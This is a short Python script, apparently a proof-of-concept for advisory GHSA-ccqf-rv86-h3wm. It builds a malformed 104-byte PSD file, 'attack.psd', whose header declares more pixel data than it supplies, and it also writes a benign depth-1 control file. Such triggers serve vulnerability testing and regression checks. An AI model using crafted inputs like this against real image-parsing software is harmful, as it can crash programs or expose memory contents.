#!/usr/bin/env python3
"""104-byte PSD trigger from GHSA-ccqf-rv86-h3wm; distinct final-row bytes."""
import os
import struct
import sys


def build(depth, payload):
    out = b"8BPS" + struct.pack(">H", 1) + b"\x00" * 6 + struct.pack(">H", 1)
    out += struct.pack(">I", 8) + struct.pack(">I", 8)
    out += struct.pack(">H", depth) + struct.pack(">H", 0)
    out += struct.pack(">I", 0) * 3 + struct.pack(">H", 0)
    out += payload
    assert len(out) == 40 + len(payload), len(out)
    return out


def main():
    d = sys.argv[1] if len(sys.argv) > 1 else "."
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "attack.psd"), "wb") as f:
        f.write(build(8, b"\x41" * 56 + bytes(range(0x10, 0x18))))
    # Matching-stride Bitmap control: depth=1, one byte per 8-pixel row, 8 rows.
    with open(os.path.join(d, "safe-depth1.psd"), "wb") as f:
        f.write(build(1, b"\x41" * 8))


if __name__ == "__main__":
    main()
